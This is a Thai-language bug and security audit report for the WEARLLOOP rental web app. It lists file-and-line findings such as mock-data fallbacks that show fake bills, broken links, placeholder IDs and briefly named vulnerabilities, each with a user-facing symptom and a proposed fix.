# รายงาน Audit End-to-End ทุก Role — WEARLLOOP (wearlloop-dotcom.github.io)

> ตรวจวันที่ 2 กรกฎาคม 2026 · วิธีตรวจ: กระจาย 16 agent (8 ทีมตรวจตามกลุ่ม role + 8 ทีม verify แบบ adversarial ไล่หักล้างทุกข้อก่อนสรุป) · อ่านโค้ดจริงทุกไฟล์ในแต่ละกลุ่ม

**ผลรวม: 67 ประเด็นที่ยืนยันแล้ว** — วิกฤต 7 · สำคัญ 22 · ย่อย 38 (รวม 3 ประเด็นจากรอบเช็คเบื้องต้น)

สิ่งที่ผ่าน: JS ทุกไฟล์ผ่าน syntax check · ทุกหน้าใน OPS_NAV (28 หน้า) โหลด ops-menu.js ครบ · DOM wiring หน้า customer หลัก (index/app.js) ครบ ไม่มี onclick ชี้ฟังก์ชันที่ไม่มีจริง · ลิงก์เมนูหลักฝั่งลูกค้าชี้ไฟล์ที่มีจริงทั้งหมด

---

## สรุปประเด็นวิกฤตที่ควรแก้ก่อน (root cause)

1. **4 หน้าไม่โหลด `data.js` ทำให้ `API.init()` พังและติดโหมด mock ถาวร** — `pay.html`, `looks.html`, `event.html`, `join.html` โหลด `api.js` ซึ่งบรรทัด 69 อ้าง `window.MOCK` จาก `data.js` → หน้าเหล่านี้ไม่เคยต่อ Supabase จริง: ลูกค้าเห็น **บิล + QR พร้อมเพย์ปลอม** ใน pay.html, กดไลก์/เซฟลุคไม่ได้ใน looks.html, สถานะจ่ายอีเวนต์เป็น demo, และกดรับคำเชิญเข้ากลุ่มไม่ได้
2. **ลิงก์จ้างงาน HR พัง 404 ทั้งหมด** — `hr.html:224` ชี้ `STAFF_BASE = /liff/staff.html` ซึ่งไม่มีแล้วหลังย้ายไฟล์มา root (ลิงก์ยืนยัน UID + ลิงก์เซ็นสัญญาจ้าง)
3. **`settings.html:186` โหลด `../liff/config.js` ที่ไม่มีอยู่** — หน้าตั้งค่าฮับของ owner ไม่มี CONFIG (path ค้างจากการย้าย liff/ → root เช่นเดียวกับข้อ 2 และ comment template ใน `ops-api.js:5` ที่ยังสอน path เก่า)
4. **ช่องโหว่ความปลอดภัย** — Stored XSS ในพอร์ทัลพาร์ทเนอร์ (`partner.html:845` ฉีดชื่อ LINE/โน้ตลูกค้าเข้า innerHTML ไม่ escape) · เอกสารบัตรประชาชนพนักงานเข้า **public bucket** (`hr.html:521`) · `forecast.html` ข้าม ops-rpc gateway ใช้ LINE UID เป็นรหัสผ่านและแก้ราคาแผนด้วย anon key ได้

---

## ลูกค้า (customer) — หน้าแรก + engine หลัก  — กลุ่ม `customer-core`

ยืนยัน 8 ประเด็น (verifier หักล้างทิ้ง 1 ข้อ)

### 🟠 สำคัญ · `app.js:3803` — ยัดตัวเลขอิมแพกต์ปลอม (demo) ให้ลูกค้าจริงใน production เมื่อ my_impact คืน null

app.js:3803 `if (!CUSTOMER._impact) CUSTOMER._impact = { rentals: 6, water_l: 16200, co2_kg: 36, charity_thb: 126, ... }` — คอมเมนต์บอกว่าเป็น demo สำหรับ localhost/ยังไม่ล็อกอิน แต่โค้ดไม่มีเงื่อนไข `!loggedIn` หรือ `USE_MOCK` ครอบเลย ขณะที่ api.js:355-359 `myImpact()` คืน null ได้ทั้งกรณี RPC ล้มเหลว และกรณี server คืน null (ลูกค้าใหม่ไม่มีข้อมูล) — ค่า fallback นี้ถูก render จริงใน renderImpactCard() (app.js:3644 โชว์เมื่อ im.rentals truthy = 6) และ openImpact() (app.js:2630)

**อาการที่ผู้ใช้เจอ:** ลูกค้าใหม่ล็อกอิน LINE จริง (USE_MOCK=false) ที่ยังไม่เคยเช่า หรือจังหวะที่ my_impact ตอบช้า/ล้ม → เปิดโปรไฟล์/หน้า 'ผลกระทบรักษ์โลกของคุณ' เห็นตัวเลขปลอม 'เข้า loop 6 รอบ · ประหยัดน้ำ 16,200 ลิตร · สมทบ ฿126 ให้เด็กยากไร้' ทั้งที่ยังไม่เคยเช่าเลย — เป็นการแสดงข้อมูลบริจาค/สิ่งแวดล้อมเท็จต่อผู้ใช้จริง

**แนวทางแก้:** เพิ่มเงื่อนไข `if (!loggedIn && !CUSTOMER._impact)` หรือ `if (CONFIG.USE_MOCK && !CUSTOMER._impact)` ก่อนใส่ค่า demo

### 🟠 สำคัญ · `api.js:69` — โปรไฟล์ mock (คุณมายา · เครดิต ฿160) รั่วมาแสดงเป็นข้อมูลจริงเมื่อ me_profile ล้มเหลว

api.js:69 `let customer = window.MOCK.CUSTOMER;` แล้วแทนที่เฉพาะ `if (data)` (บรรทัด 80) — ถ้า meRpc('me_profile') error (เน็ตหลุด, gateway ล่ม, token หมดอายุหลัง meReauthTried ถูกตั้งแล้วใน me-api.js:24 ซึ่งกัน redirect ซ้ำ) ลูกค้าที่ 'ล็อกอินแล้ว' (s.lineUid มีค่า → ผ่าน login gate ที่ app.js:3784) จะได้ CUSTOMER = MOCK.CUSTOMER (data.js:8: name:'คุณมายา', bust_in:35, credit_balance:160, season:'winter') → app.js:3790 แสดงเครดิต ฿160 บน header, fitConfidence/badge 'เข้าโทนคุณ' คำนวณจากสัดส่วน mock, และ CUSTOMER.id undefined ทำให้ wishlist/ออเดอร์ขึ้นข้อความให้ล็อกอินทั้งที่ล็อกอินอยู่

**อาการที่ผู้ใช้เจอ:** ลูกค้าจริงเปิดแอปตอนเน็ตไม่เสถียร/เซสชันมีปัญหา → เห็น 'กระเป๋า LLOOP ฿160' ที่ไม่มีจริง + ป้าย 'พอดี XX%' และ 'เข้าโทนคุณ' ที่คำนวณจากหุ่นของ 'คุณมายา' → ตัดสินใจเช่าจากข้อมูลปลอม และงงว่าทำไมกดดูออเดอร์แล้วบอกให้เข้าสู่ระบบ

**แนวทางแก้:** เมื่อ lineUid มีค่าแต่ me_profile ล้มเหลว ให้ตั้ง customer เป็น object ว่าง {display_name: profile.displayName} + credit 0 และโชว์ข้อความ 'โหลดโปรไฟล์ไม่สำเร็จ' แทนการใช้ MOCK.CUSTOMER

### 🟡 ย่อย · `config.js:8` — GA4 ตายสนิท: GA4_ID ยังเป็น placeholder และ gaEvents ไม่ถูกเรียกจากที่ไหนเลยทั้ง repo

config.js:8 `GA4_ID:'G-XXXXXXXXXX'` → analytics.js:5 `if (!id || id === 'G-XXXXXXXXXX') return;` ทำให้ gtag ไม่ถูกโหลดและ window.gtag ไม่ถูกนิยาม → analyticsTrack/analyticsIdentify เป็น no-op ทั้งหมด · ซ้ำร้าย grep ทั้ง repo พบ `gaEvents`/`analyticsTrack` เฉพาะใน analytics.js เอง — ไม่มีหน้าไหน (รวม app.js flow จอง/จ่าย) เรียก gaEvents.checkoutStart / paymentInitiated / wishlistAdd เลย ดังนั้นต่อให้ใส่ Measurement ID จริง ก็จะได้แค่ page_view อัตโนมัติ ไม่มี funnel event ใด ๆ (มีแต่ fbTrack ของ Meta Pixel และ track() ภายในผ่าน log_events)

**อาการที่ผู้ใช้เจอ:** ทีมการตลาดเปิด GA4 ดู begin_checkout / payment_initiated ของลูกค้า → ไม่มีข้อมูลเลยแม้แต่ event เดียว เพราะ (1) ID ยังเป็น placeholder (2) โค้ด funnel ไม่เคยเรียก gaEvents ที่เตรียมไว้

**แนวทางแก้:** ใส่ Measurement ID จริงใน config.js และเรียก gaEvents.checkoutStart/paymentInitiated ในจุดเดียวกับ fbTrack('InitiateCheckout'/'Purchase') ใน app.js reserve()

### 🟡 ย่อย · `me-api.js:14` — liff.init ถูกเรียกซ้ำ 2 ชั้น (liffAuth.js + me-api.js) บนหน้าเดียว — โค้ดเองระบุว่า init ซ้ำทำ SDK throw

flow ของ index.html: api.js init() → LiffAuth.login() → liffAuth.js:7 `_initP = liff.init({liffId})` (ครั้งที่ 1) จากนั้น meRpc('me_profile') → me-api.js:11-16 ensureInit() มี flag `_inited` ของตัวเอง ไม่รู้จัก _initP ของ LiffAuth → เรียก `await liff.init({liffId})` ซ้ำเป็นครั้งที่ 2 บน SDK instance เดียวกัน — liffAuth.js:3 คอมเมนต์ของโค้ดเองยืนยันว่า 'liff.init() ซ้ำ ... ทำ SDK throw' ซึ่งเป็นเหตุให้เขาทำ shared promise ใน liffAuth แต่ me-api.js (v54) ไม่ได้ใช้ตัวเดียวกัน ถ้า SDK เวอร์ชันที่โหลด throw จริง ทุก meRpc จะเข้า catch (me-api.js:58-60) คืน error → me_profile/quote/my_rentals ล้มทั้งหมด แล้วต่อยอดเป็น bug ข้อ MOCK-leak ด้านบน

**อาการที่ผู้ใช้เจอ:** ลูกค้าเปิด LIFF → บูตสำเร็จแต่ทุก RPC ผ่าน gateway (โปรไฟล์ สรุปยอด ออเดอร์ของฉัน) ล้มเงียบ ๆ เพราะ liff.init ครั้งที่สอง throw — อาการขึ้นกับเวอร์ชัน LIFF SDK (โหลดแบบ edge/2 อัปเดตเองตลอด) จึงเป็นระเบิดเวลาเมื่อ SDK เข้มงวดเรื่อง init ซ้ำ

**แนวทางแก้:** ให้ me-api.js ใช้ LiffAuth.ensureInit() (มี export อยู่แล้วใน liffAuth.js:48) หรือแชร์ promise init ตัวเดียวกันผ่าน window

### 🟡 ย่อย · `app.js:668` — การ์ดชุดที่ไม่มี occasion_tags แสดงคำว่า 'undefined' ใน hover bar

gridCardHtml app.js:668 `<span>${occName(g.occasion_tags[0])}</span>` — เมื่อ occasion_tags ว่าง (api.js:54 map เป็น `r.occasion_tags || []` ซึ่งเกิดจริงกับชุดที่ intake ยังไม่แท็กโอกาส) g.occasion_tags[0] = undefined → occName (app.js:124 `c => I18N[lang].occ[c] || c`) คืน undefined → template แทรกข้อความ 'undefined' ลง DOM

**อาการที่ผู้ใช้เจอ:** ลูกค้าบน desktop (หรือ webview ที่ hover ได้) เอาเมาส์ชี้การ์ดชุดที่ยังไม่แท็กโอกาส → แถบล่างการ์ดแสดง 'undefined' คู่กับ % พอดีและราคา

**แนวทางแก้:** เปลี่ยนเป็น `${g.occasion_tags[0] ? occName(g.occasion_tags[0]) : ''}` หรือให้ occName คืน '' เมื่อ c เป็น falsy

### 🟡 ย่อย · `app.js:195` — setLang ไม่ re-render datebar / personal rail / spotlight — สลับเป็น EN แล้วส่วนเหล่านี้ค้างภาษาไทย

setLang (app.js:188-200) เรียก renderEvent/renderCatnav/renderChips/renderDiscover/renderFilters/renderGrid แต่ไม่เรียก renderDatebar() (label 'จะใส่ชุดวันไหน?' + ปุ่ม 'เฉพาะที่ว่าง/ล้างวันที่' สร้างตาม lang ใน app.js:710-718), ไม่เรียก renderPersonalRail() (หัวข้อ 'ดูล่าสุด/เพราะคุณดู' app.js:1106) และไม่เรียก window.renderSpotlight (index.html:1296-1313 ซึ่ง hardcode ไทย 'รอการค้นพบ/ค้นพบชุดนี้' ไม่มีทางแปลเลย) — ต่างจากส่วนอื่นที่แปลครบผ่าน applyStatic/I18N

**อาการที่ผู้ใช้เจอ:** ลูกค้าต่างชาติกดปุ่ม EN บน prefbar → hero/กริด/ฟิลเตอร์เป็นอังกฤษ แต่แถบ 'จะใส่ชุดวันไหน?', rail 'ดูล่าสุด', และ spotlight ยังเป็นไทยปนอยู่กลางหน้า

**แนวทางแก้:** เพิ่ม renderDatebar(); renderPersonalRail(); window.renderSpotlight&&renderSpotlight(GARMENTS); ใน setLang และย้ายข้อความ spotlight เข้า I18N

### 🟡 ย่อย · `index.html:1358` — Places autocomplete อ่าน window.lang ที่ไม่มีจริง (lang ประกาศด้วย let ใน app.js) — ผู้ใช้ EN ได้ผลค้นหาสถานที่ภาษาไทยเสมอ

index.html:1358 `language: (window.lang === 'en' ? 'en' : 'th')` — ตัวแปร lang ใน app.js:51 ประกาศด้วย `let lang = ...` ที่ top-level ซึ่งไม่กลายเป็น property ของ window ดังนั้น window.lang เป็น undefined ตลอด เงื่อนไขจึงตกไปฝั่ง 'th' เสมอ

**อาการที่ผู้ใช้เจอ:** ลูกค้าที่ตั้งภาษา EN พิมพ์ชื่อสถานที่ในช่อง LLOOP Atelier → dropdown แนะนำสถานที่เป็นภาษาไทยทุกครั้ง แม้ UI ที่เหลือเป็นอังกฤษ

**แนวทางแก้:** อ้าง localStorage.getItem('lloop_lang') ตรง ๆ ในสคริปต์นี้ หรือให้ app.js expose window.lang

### 🟡 ย่อย · `app.js:1004` — async loader ของหน้ารายละเอียด (rating/ปฏิทิน/fit/social proof) ไม่ผูกกับชุดที่เปิดอยู่ — เปิดชุด A แล้วสลับไป B เร็ว ๆ ข้อมูลของ A ไปโผล่ในชีตของ B

openDetail (app.js:1004-1010) ยิง renderAvailCalendar/loadRating/loadFit/loadSocialProof/loadRecommendWith แบบไม่ await และไม่เช็คว่า response ยังตรงกับ window._detailId ปัจจุบันไหม — ทุกตัวเขียนลง element id ตายตัว (#ratingline, #availcal, #fitsummary, #socialproof, #recoWith) ที่ถูกสร้างใหม่ทุกครั้งที่เปิดชีต ดังนั้น response ช้าของชุดก่อนหน้าจะเขียนทับข้อมูลของชุดปัจจุบัน (เช่น เรตติ้ง 4.9★ ของชุด A แสดงบนชุด B, ปฏิทินวันว่างของ A แสดงเป็นของ B)

**อาการที่ผู้ใช้เจอ:** ลูกค้าเน็ตช้าไล่เปิดชุด A → ปิด → เปิดชุด B ภายใน 1-2 วิ → เห็นปฏิทิน 'ว่าง/ไม่ว่าง' และรีวิวของชุด A บนหน้าชุด B → เลือกวันจากปฏิทินผิดชุด (server ยัง re-check ตอนจองจึงไม่จองชนจริง แต่ผู้ใช้สับสน/เสียเวลา)

**แนวทางแก้:** เก็บ token = ++seq ตอน openDetail แล้วให้ทุก loader เช็ค token/window._detailId ก่อนเขียน DOM


## ลูกค้า (customer) — หน้ารอง  — กลุ่ม `customer-secondary`

ยืนยัน 9 ประเด็น (verifier หักล้างทิ้ง 0 ข้อ)

### 🔴 วิกฤต · `pay.html:124` — pay.html ไม่โหลด data.js → API.init() พังทุกครั้ง → ลูกค้าจริงเห็นบิล MOCK + QR พร้อมเพย์ปลอมแทนบิลจริง

pay.html โหลดเฉพาะ config.js, liffAuth.js, me-api.js, api.js, nav.js (บรรทัด 117-125) — ไม่มี data.js ที่ define window.MOCK · แต่ api.js init() ในโหมด live (USE_MOCK=false ใน config.js:3) รันบรรทัด 69 `let customer = window.MOCK.CUSTOMER;` และบรรทัด 111 `OCCASIONS: window.MOCK.OCCASIONS` เสมอ → TypeError: Cannot read properties of undefined ทุกครั้ง → boot() ใน pay.html:186-192 catch แล้ว LIVE คงเป็น false → เข้า branch mock ที่บรรทัด 216-219: `SUMMARY = MOCK_SUMMARY` (บิลของ 'คุณยายสมร' ยอด ฿780, ที่อยู่ลาดพร้าว) และ `PAY = MOCK_PAY` (บัญชี '123-4-56789-0' + PromptPay '0649990250') → renderBill วาด QR พร้อมเพย์ฝังยอด ฿780 จริง ๆ ด้วย promptpayBrandedQR · group_order_summary / group_pay_confirm ไม่ถูกเรียกเลย

**อาการที่ผู้ใช้เจอ:** ลูกค้าที่ถูกหารบิลกลุ่มกดปุ่ม 'จ่ายส่วนของฉัน' จาก LINE เปิด pay.html?order=OG-xxxx → ล็อกอิน LINE สำเร็จแล้วก็ตาม หน้ากลับแสดงบิลปลอมของ 'คุณยายสมร' ยอด ฿780 พร้อม QR พร้อมเพย์เบอร์ 0649990250 ที่สแกนโอนได้จริง — ลูกค้าอาจโอนผิดยอด/ผิดปลายทาง และกด 'ฉันโอนแล้ว' ก็ไม่บันทึกอะไรเข้าระบบ (mock ok=true) ทำให้ hold 30 นาทีหลุดโดยไม่มีใครรู้

**แนวทางแก้:** เพิ่ม <script src="data.js?v=54"></script> ก่อน api.js ใน pay.html (และแก้ api.js ให้ init() ไม่พึ่ง window.MOCK ในโหมด live เช่น `const MOCK = window.MOCK || {}`) · พิจารณาตัด MOCK fallback ออกจาก pay.html เพราะเสี่ยงโชว์ข้อมูลการเงินปลอม

### 🔴 วิกฤต · `looks.html:198` — looks.html ไม่โหลด data.js → API.init() พังเหมือนกัน → ผู้ใช้ที่ล็อกอินแล้วกดไลก์/เซฟ/คอมเมนต์/แชร์ลุคไม่ได้เลย

looks.html โหลด config.js, liffAuth.js, me-api.js, api.js, nav.js (บรรทัด 193-199) โดยไม่มี data.js → window.API.init() โยน TypeError ที่ api.js:69 (window.MOCK undefined) ทุกครั้งในโหมด live → boot() (looks.html:215-228) catch แล้ว LIVE=false, CUSTOMER=null ถาวร · ฟีดสาธารณะยังโหลดได้ (communityFeed ใช้ anon client) แต่ทุก action ที่เช็ค `if(!LIVE)` — likeLook (496), saveLook (470), storyLike (437), reactLook (423), reportLook (429), doFollow (581), openComments (แถบพิมพ์ซ่อนที่ 509), openShare (626), openEarnings (593) — เด้ง toast 'เข้าสู่ระบบผ่าน LINE...' เสมอแม้ล็อกอิน LINE สำเร็จแล้ว · แท็บ 'ที่ตามอยู่'/'บันทึกไว้' ก็โชว์ข้อความให้ล็อกอินตลอด

**อาการที่ผู้ใช้เจอ:** ลูกค้าเปิดหน้า 'ชุมชน The Loop Looks' จากเมนูใน index (app.js:2060) ทั้งที่ล็อกอิน LINE อยู่แล้ว → กดหัวใจ/เซฟ/ติดตาม/ปุ่ม 'แชร์ลุคของฉัน · รับเครดิต' → ได้ toast ให้เข้าสู่ระบบวนไปไม่รู้จบ ฟีเจอร์ชุมชนและรายได้ครีเอเตอร์ใช้ไม่ได้ทั้งหน้า

**แนวทางแก้:** เพิ่ม <script src="data.js?v=54"></script> ก่อน api.js?v=54 ใน looks.html หรือแก้ api.js init() ให้ไม่อ้าง window.MOCK ตรง ๆ ในโหมด live

### 🟠 สำคัญ · `links.html:381` — ลิงก์ placeholder ค้าง 3 จุดในหน้า link-in-bio สาธารณะ — CTA หลัก 'เริ่มเลย' ชี้ liff.line.me/YOUR_LIFF_ID

บรรทัด 381: `<a class="link-card feat" href="https://liff.line.me/YOUR_LIFF_ID">` (การ์ดหลัก 'เริ่มเลย · จองชุด · ลองฟรี') · บรรทัด 447: `href="https://lin.ee/YOUR_LINE_ID"` (การ์ด LINE Official) · บรรทัด 486: `href="https://line.me/ti/g2/YOUR_OPENCHAT_ID"` (การ์ด LINE OpenChat 'เข้าฟรี') — ทั้งที่ LIFF_ID จริง ('2010486714-1g6lDuHo') มีใน config.js:6 และถูกใช้แล้วใน about.html:155,243

**อาการที่ผู้ใช้เจอ:** ผู้ติดตามกดลิงก์จาก bio IG/TikTok เข้า links.html แล้วแตะการ์ดหลัก 'เริ่มเลย' หรือ 'LINE Official'/'OpenChat' → เจอหน้า error ของ LINE (LIFF ID not found / ลิงก์เสีย) — conversion หลุดที่ปุ่มที่สำคัญที่สุดของหน้า

**แนวทางแก้:** แทน YOUR_LIFF_ID ด้วย 2010486714-1g6lDuHo และใส่ lin.ee / OpenChat ID จริง (หรือซ่อนการ์ดจนกว่าจะมีลิงก์จริง)

### 🟠 สำคัญ · `review.html:816` — submit_review เช็คความสำเร็จด้วย j.ok ซึ่งขัดกับ contract ของ me-rpc ที่ไฟล์อื่นทั้งระบบใช้ ({data,error})

บรรทัด 816: `if (j.ok) data = j.data; else error = {...}` — แต่ client มาตรฐานของ gateway เดียวกัน (me-api.js:46-57) ถือว่าสำเร็จเมื่อ HTTP ok และไม่มี out.error แล้วอ่าน out.data โดยไม่มี field `ok` เลย · แม้แต่ loadProfile ในไฟล์เดียวกัน (บรรทัด 752-757) ก็อ่าน `j.data` ตรง ๆ ไม่เช็ค ok · ถ้า gateway ตอบรูป {data:...} ตาม contract ของ me-api.js การส่งรีวิวที่สำเร็จจริงจะเข้า branch error เสมอ (โชว์ 'เกิดข้อผิดพลาด: ส่งรีวิวไม่สำเร็จ') ทั้งที่รีวิว/เครดิตเข้าระบบแล้ว — และการกดส่งซ้ำอาจสร้างรีวิวซ้ำ

**อาการที่ผู้ใช้เจอ:** ลูกค้ากรอกรีวิว+แนบรูปแล้วกด 'ส่งรีวิว' → หน้าโชว์ error ทั้งที่ backend บันทึกแล้ว → ลูกค้ากดส่งซ้ำหลายครั้ง หรือเลิกรีวิวไปเลย ไม่เคยเห็นหน้า 'ขอบคุณ +10 เครดิต'

**แนวทางแก้:** ใช้ contract เดียวกับ me-api.js: ถือว่าสำเร็จเมื่อ r.ok && !j.error (หรือดีที่สุด: โหลด me-api.js แล้วเรียกผ่าน window.meRpc('submit_review', ...) แทน fetch ตรง)

### 🟡 ย่อย · `review.html:623` — decodeURIComponent ซ้อนสองชั้นบน query params — ชื่อชุด/ไซส์/ช่วงวันที่ที่มี '%' ทำให้สคริปต์ทั้งหน้าตาย

บรรทัด 623-625: `const GARMENT_NAME = decodeURIComponent(params.get('garment_name') || '')` (รวม size, date_range) — URLSearchParams.get() decode ให้แล้วรอบหนึ่ง การ decode ซ้ำทำให้ค่าใด ๆ ที่มี '%' ตามด้วยอักขระไม่ใช่ hex (เช่น 'ผ้าไหม 100%', ส่วนลด '50%') โยน URIError: malformed URI ที่ top-level ของ <script> → โค้ดถัดจากนั้นทั้งหมด (ปุ่มคะแนน 643, ปุ่ม fit 652, chips 661/670, upload 679, submit 772, init 846) ไม่ถูกผูกเลย

**อาการที่ผู้ใช้เจอ:** ระบบส่งลิงก์รีวิวทาง LINE เป็น review.html?garment_name=เดรสไหม%20100%25&rental_id=... → เปิดหน้าแล้วชื่อชุดขึ้น '—', กดให้คะแนน/ส่งรีวิวไม่ได้เลยทั้งหน้า (ไม่มี handler ใดทำงาน) โดยไม่มี error ให้ผู้ใช้เห็น

**แนวทางแก้:** ตัด decodeURIComponent ออก ใช้ params.get(...) ตรง ๆ: `const GARMENT_NAME = params.get('garment_name') || ''` (เช่นเดียวกับ SIZE, DATE_RANGE)

### 🟡 ย่อย · `rental-terms.html:1048` — เวอร์ชันสัญญาใน footer ไม่ตรงกันระหว่างไทย (rental-2026e) กับคำแปลอังกฤษ (rental-2026d)

บรรทัด 1048: ข้อความไทย 'เวอร์ชัน rental-2026e' แต่ attribute data-i18n (ที่ nav.js ใช้แทนที่ innerHTML เมื่อสลับเป็น EN) เขียนว่า 'version rental-2026d' — คำแปลไม่ถูกอัปเดตตามตอน bump เวอร์ชันสัญญา

**อาการที่ผู้ใช้เจอ:** ลูกค้าที่สลับหน้าเป็นภาษาอังกฤษเห็นว่าตัวเองยอมรับสัญญาเวอร์ชัน 2026d ทั้งที่ฉบับบังคับใช้จริง (ไทย ซึ่งสัญญาระบุว่ามีผลก่อน) คือ 2026e — สร้างความคลาดเคลื่อนของหลักฐานเวอร์ชันที่ลูกค้าอ้างอิงเวลามีข้อพิพาท

**แนวทางแก้:** แก้ data-i18n เป็น 'version rental-2026e'

### 🟡 ย่อย · `rental-terms.html:1007` — กล่อง 'ยืนยันการยอมรับ' เป็น checkbox หลอก — ติ๊กแล้วไม่บันทึก/ไม่ส่งอะไรเลย แต่ข้อความอ้างว่าใช้เป็นหลักฐานทางกฎหมาย

บรรทัด 1007 `<label class="checkbox-row" onclick="toggleCheck(this)">` → toggleCheck (บรรทัด 1053-1056) แค่ toggle class 'checked' ของ div#chk เพื่อเปลี่ยนสี ไม่มีการเรียก API, ไม่เก็บ state, ไม่มีปุ่ม/ลิงก์ต่อจากนั้น — แต่ .accept-note (บรรทัด 1018) เขียนว่า 'การยืนยันนี้มีผลผูกพันตามกฎหมาย และใช้เป็นหลักฐานในการดำเนินคดี' ทั้งที่ระบบไม่บันทึกการติ๊กนี้เลย (การ acceptTerms จริงอยู่ใน flow จองบน index ผ่าน api.js:329)

**อาการที่ผู้ใช้เจอ:** ลูกค้าอ่านสัญญาแล้วติ๊ก 'ข้าพเจ้าได้อ่านและยอมรับ...' เข้าใจว่าได้ยืนยันสัญญาแล้ว รีเฟรชหน้าก็หาย ระบบไม่มีหลักฐานใด ๆ — UI ให้ความเข้าใจผิดเรื่องผลทางกฎหมาย

**แนวทางแก้:** เอากล่อง checkbox ออกหรือเปลี่ยนเป็นข้อความอธิบายว่า 'การยอมรับเกิดขึ้นเมื่อกดยืนยันการเช่าในแอป' · ถ้าจะเก็บจริงต้องยิง record_consent ผ่าน gateway

### 🟡 ย่อย · `about.html:244` — ลิงก์ Instagram ใน about.html ชี้ @lloop.studio ขณะที่ links.html ใช้ instagram.com/lloop.th — แบรนด์เก่าค้าง

about.html:244 `<a href="https://www.instagram.com/lloop.studio" class="btn-ghost">IG @lloop.studio</a>` แต่หน้า link-in-bio (links.html:406) ใช้ `https://instagram.com/lloop.th` และแบรนด์อื่นทั้งระบบใช้ lloop.th — สอดคล้องกับ og:image ของ about ที่ยังชี้โดเมนเก่า lloop-studio.github.io (bug ที่รู้แล้ว) แสดงว่า about.html ค้าง branding เก่าอีกจุดที่ยังไม่ถูกรายงาน

**อาการที่ผู้ใช้เจอ:** ลูกค้ากดปุ่ม IG จากท้ายหน้า 'เรื่องเล่าของเรา' → ไปโปรไฟล์ @lloop.studio ที่ไม่ใช่บัญชีหลัก (หรือไม่มีอยู่) แทน @lloop.th

**แนวทางแก้:** แก้ href และข้อความปุ่มเป็น instagram.com/lloop.th ให้ตรงกับ links.html

### 🟡 ย่อย · `g.html:230` — g.html เปิดดูได้โดยไม่ล็อกอินจริง แต่แค่ 'เลือกวันที่' ก็ถูกเด้งออกไปหน้า LINE login กลางคัน (ผ่าน meRpc reauth) และวันที่ที่เลือกหาย

ผู้ใช้ไม่ล็อกอิน: renderItem แสดงปุ่ม 'เข้าสู่ระบบด้วย LINE เพื่อจอง' ถูกต้อง แต่ช่องวันที่ (บรรทัด 196 onchange=onPick) ใช้งานได้ → onPick เรียก `window.API.quote(...)` (บรรทัด 230) → api.js:568 วิ่งผ่าน window.meRpc → me-api.js:35-38 พบว่ายังไม่ล็อกอินก็เรียก reauth() → liff.login redirect ทันที (me-api.js:27) ทั้งที่ผู้ใช้แค่จะดูราคา — ต่างจากเจตนาของหน้า (ปุ่ม signIn แยกไว้แล้ว และ LiffAuth.login ตั้งใจไม่ auto-redirect บนเว็บ) · กลับมาจาก login วันที่/จำนวนวันที่เลือกไว้หายเพราะ redirectUri เป็น baseUrl ไม่มี query

**อาการที่ผู้ใช้เจอ:** คนสแกน QR ที่ป้ายชุดด้วยเบราว์เซอร์ปกติ ยังไม่กดล็อกอิน แค่แตะเลือกวันที่จะใช้เพื่อเช็คราคา → ถูกพาออกไปหน้า LINE login ทันทีโดยไม่ได้ตั้งใจ กลับมาแล้วต้องเลือกวันใหม่ · ถ้ากดยกเลิก login สรุปยอด/ราคาจะไม่ขึ้นเลย (quote คืน null เงียบ ๆ)

**แนวทางแก้:** ใน onPick ให้ข้ามการเรียก quote เมื่อ !(CUSTOMER && CUSTOMER.id) แล้วแสดงข้อความ 'เข้าสู่ระบบเพื่อดูสรุปยอด' หรือให้ me-api ไม่ auto-reauth เมื่อถูกเรียกจาก context ที่แค่แสดงข้อมูล


## ลูกค้ากลุ่ม (family / wedding / event / group checkout)  — กลุ่ม `group-flows`

ยืนยัน 6 ประเด็น (verifier หักล้างทิ้ง 0 ข้อ)

### 🔴 วิกฤต · `event.html:157` — event.html ไม่โหลด data.js ทำให้ window.API.init() โยน error เสมอ — หน้าสถานะการจ่ายติดโหมด mock ถาวร ไม่เคยต่อ Supabase จริง

ตอบคำถาม audit โดยตรง: หน้านี้ 'มีโค้ด LIVE ครบ' (เรียก window.API.groupEventStatus ที่ event.html:258 และ action name 'group_event_status' มีจริงใน api.js:806 พร้อม export ที่ api.js:1115 — ชื่อ action ตรงกัน ไม่ใช่ปัญหา) แต่ในทางปฏิบัติหน้าไม่มีวันเข้าโหมด LIVE ได้เลย เพราะบล็อก <script> ของ event.html (บรรทัด 155-161) โหลดแค่ config.js, liffAuth.js, me-api.js, api.js, nav.js — ไม่มี data.js ในขณะที่ family.html:271, group-checkout.html:278 และ wed.html:49 โหลด data.js ทุกหน้า ปัญหาคือ api.js init() ในเส้นทาง non-mock (CONFIG.USE_MOCK=false ตาม config.js:3) อ้าง `let customer = window.MOCK.CUSTOMER;` ที่ api.js:69 (และ `window.MOCK.OCCASIONS` ที่ api.js:111) โดย window.MOCK ประกาศไว้ที่ data.js:2 เท่านั้น → init() โยน TypeError ทันที → ถูก try/catch ใน boot() ของ event.html:227-233 กลืนเงียบ → LIVE คงเป็น false → แสดง MOCK_STATUS (พลอย/น้องเป่าเปา/คุณยายสมร, EVT-204517) พร้อมข้อความ 'โหมดพรีวิว (mock)' เสมอ นอกจากนี้ demo note ที่ event.html:152 ยังอ้าง path เก่า 'liff/api.js' (ทั้งข้อความไทยและ data-i18n อังกฤษ) ซึ่งเป็นซากจากตอนย้าย liff/ → root (ไฟล์จริงคือ /api.js) — เป็นแค่ข้อความ ไม่ใช่ script src แต่ยืนยันว่าหน้านี้ตกหล่นจากการ migrate

**อาการที่ผู้ใช้เจอ:** หัวหน้ากลุ่มจองแบบ 'ต่างคนต่างจ่าย' สำเร็จจริงใน group-checkout.html (LIVE) แล้วกดปุ่ม 'ดูสถานะการจ่าย' (group-checkout.html:964 ลิงก์ไป event.html?event=EVT-xxx) → หน้า event.html เปิดขึ้นแต่ init พังเงียบ ตกลง mock → หัวหน้ากลุ่มเห็นรายชื่อปลอม 'พลอย/น้องเป่าเปา/คุณยายสมร' ยอด ฿1,151 แทนสถานะจ่ายจริงของกลุ่มตัวเอง และ auto-refresh 20 วิ (ทำงานเฉพาะ LIVE) ก็ไม่ทำงาน — ฟีเจอร์ติดตามว่าใครจ่ายแล้ว/ยังใช้งานจริงไม่ได้เลย

**แนวทางแก้:** เพิ่ม <script src="data.js?v=38"></script> ก่อน liffAuth.js ใน event.html (เหมือน family.html/group-checkout.html) หรือแก้ api.js:69,111 ให้ fallback เมื่อ window.MOCK ไม่มี (`(window.MOCK||{}).CUSTOMER || {}`) และอัปเดตข้อความ demo note ที่ :152 จาก 'liff/api.js' เป็น 'api.js'

